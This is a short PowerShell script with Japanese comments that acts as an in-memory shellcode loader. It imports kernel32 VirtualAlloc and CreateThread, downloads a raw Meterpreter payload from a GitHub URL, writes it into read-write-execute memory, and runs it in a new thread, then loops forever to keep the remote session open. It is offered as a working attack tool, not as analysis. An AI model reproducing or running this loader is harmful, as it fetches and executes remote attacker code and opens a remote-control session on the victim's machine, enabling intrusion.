# 1. メモリ操作用のAPI定義
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@
Add-Type -TypeDefinition $Kernel32

# 2. シェルコード（RAWバイナリ）のダウンロード
# 暗号化されていないため、ダウンロードしたデータがそのまま実行可能なコードになります
$url = "https://raw.githubusercontent.com/Kenji-S113/001/refs/heads/main/meterpreter_retry.bin"
$shellcode = (New-Object System.Net.WebClient).DownloadData($url)
$size = $shellcode.Length

if ($size -gt 0) {
    Write-Host "Shellcode downloaded: $size bytes"
    
    # 3. メモリ領域の確保 (RWX: Read/Write/Execute)
    # 0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
    $address = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)

    if ($address -ne [IntPtr]::Zero) {
        # 4. メモリへシェルコードをコピー
        [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $size)

        # 5. スレッドを作成して実行
        $hThread = [Kernel32]::CreateThread([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        
        if ($hThread -ne [IntPtr]::Zero) {
            Write-Host "Thread launched successfully. Address: $address"
            # プロセスが終了しないように維持（Meterpreterセッション維持のため）
            while($true) { Start-Sleep -Seconds 60 }
        }
    } else {
        Write-Error "VirtualAlloc failed. Check EDR/AV logs."
    }
}